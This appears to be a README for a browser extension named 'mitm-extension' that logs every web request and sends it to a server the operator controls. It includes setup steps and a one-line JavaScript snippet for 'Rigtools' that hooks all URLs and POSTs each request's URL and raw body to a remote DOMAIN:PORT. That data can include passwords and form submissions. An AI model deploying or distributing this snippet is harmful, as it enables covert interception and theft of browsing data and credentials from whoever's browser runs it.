# mitm-extension
Log all request sent to and from your browser

## Setup
```sh
$ git clone https://github.com/entrpix/mitm-extension
```

## Extension
- Inside `mitm-extension/extension/background.js` edit:
  - `SERVER_URL` to be your server
  - `TOKEN` to be your token
- Zip the extension
- Then go to `chrome://extensions`
  - Enable developer mode
  - Load extension

## Server
```sh
$ cd mitm-extension
$ cd server
$ touch .env
$ echo "TOKEN=YOUR_TOKEN" > .env
$ (p)npm i
$ node index.js
```

To access your logs visit `DOMAIN:PORT/logs?auth=TOKEN`

## Rigtools
Requires `webRequest` premission
```js
chrome.webRequest.onBeforeRequest.addListener(d => fetch('http://DOMAIN:PORT/create', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authentication': 'TOKEN' }, body: JSON.stringify({ method: d.method, date: new Date().toISOString(), url: d.url, requestBody: d.requestBody && d.requestBody.raw ? String.fromCharCode.apply(null, new Uint8Array(d.requestBody.raw[0].bytes)) : null }) }).catch(e => console.error('Error:', e)), { urls: ["<all_urls>"] }, ["requestBody"]);
```
